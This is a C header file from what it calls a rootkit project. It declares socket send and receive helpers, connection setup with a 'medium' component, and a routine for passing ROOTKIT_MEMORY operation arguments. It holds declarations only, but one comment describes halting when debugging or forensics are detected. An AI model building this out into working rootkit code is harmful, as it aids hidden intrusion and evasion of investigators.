#pragma once
#include "parsing.h"

#define MAX_IPV4_SIZE 16

BOOL IsQuickTerm(PASS_DATA result);  // function that checks if the operations need to stop (debugging, forensics, network errors..)
PASS_DATA SendData(SOCKET SendTo, PVOID SrcData, int Size, BOOL Silent, int Flags);  // send data through a socket
PASS_DATA RecvData(SOCKET GetFrom, int Size, PVOID ToBuf, BOOL Silent, int Flags);  // receive data through a socket
int InitConn(NETWORK_INFO Sender, NETWORK_INFO Server);  // initiate the connection with the medium
void CleanNetStack(SOCKET sockfrom);  // clean the network stack from unreceived data
NETWORK_INFO InitNetInfo(sockaddr_in AddrInfo, USHORT Port, const char* IP, SOCKET Sock);  // initiate a singular network structure for either side (medium/client)
void SetNetStructs(const char* SrvIP, const char* SndIP, USHORT SrvPort, USHORT SndPort, NETWORK_INFO* NetArr);  // initiate the network data structures of the medium and the client
BOOL PassString(SOCKET tosock, const char* String);  // pass a string (mostly a module name) from the client to the medium
BOOL PassArgs(ROOTKIT_MEMORY* Rootinst, SOCKET tosock, BOOL Retrieve);  // pass the main arguments' structure to the medium and (maybe) retrieve it back to the client to see the results of the operation